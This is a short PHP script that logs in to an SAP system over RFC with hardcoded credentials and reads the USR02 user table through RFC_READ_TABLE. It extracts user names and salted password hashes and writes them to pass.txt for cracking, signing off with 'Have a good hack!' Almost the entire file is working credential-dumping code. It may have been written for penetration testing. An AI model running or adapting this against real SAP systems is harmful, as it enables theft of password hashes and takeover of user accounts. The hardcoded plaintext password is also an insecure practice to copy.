<?php
    require_once("/usr/local/saprfc/saprfc.php"); 

    const SAP_IP = "192.168.10.30";
    const SAP_NR = "01";
    const SAP_ID = "IDE";
    const SAP_CLIENT = "400";
    const SAP_USER = "EINKAUFSCHEF";
    const SAP_PASSWD = "Init1234";
	//const SAP_ROUTER = '/H/www.evalco.eu/S/3299/W/Gk65tP67RsR32/H/';
    

    echo "Start the call to SAP...\n";

    $sap = new saprfc(array(
                        "logindata"=>array(
                            "ASHOST"=>SAP_IP        // application server
                            ,"SYSNR"=>SAP_NR                // system number
                            ,"CLIENT"=>SAP_CLIENT           // client
                            ,"LANG"=>"EN"
                            ,"USER"=>SAP_USER           // user
                            ,"PASSWD"=>SAP_PASSWD       // password
                            //,"SAPROUTER"=>SAP_ROUTER
                            )
                        ,"show_errors"=>false           // let class printout errors
                        ,"debug"=>false)) ;                 // detailed debugging information
                            
        $sap_result=$sap->callFunction("RFCPING",array());                             

        // Call successfull?
        if ($sap->getStatus() == SAPRFC_OK) {
        } else { 
            echo  "The user has no permissions for RFC access at all: ".$sap->getStatusText(). "\n"; $sap->logoff(); return 1;
        }

        $sap_result=$sap->callFunction("RFC_READ_TABLE",
										array(  array("IMPORT","QUERY_TABLE","USR02"), array("TABLE","FIELDS",array(array("FIELDNAME" => "BNAME"),array("FIELDNAME" => "PWDSALTEDHASH")))
                                        ));                             

        // Call successfull?
        if ($sap->getStatus() == SAPRFC_OK) {
        } else { 
            echo  "ERROR: ".$sap->getStatusText(). "\n"; $sap->logoff(); return 1;
        }
    
        // Logoff/Close saprfc-connection LL/2001-08
        $sap->logoff(); $users = array();
        foreach($sap_result["DATA"] as $item)
        {
            $users[trim(substr($item["WA"],0,12))] = array("hash" => substr($item["WA"],12,strpos($item["WA"],"}",12)-11),"pass" => trim(substr($item["WA"],strpos($item["WA"],"}",12)+1)));
        }
        echo "End the call to SAP...\n";

        echo "Generating file pass.txt with users and hashed passwords\n";

        $file = fopen("pass.txt", "w");
        foreach($users as $user => $line)
        {
            fputs($file,$line["hash"].$line["pass"]."\n");
        }
        fclose($file);

        echo "File generated. Have a good hack!\n";
        
?>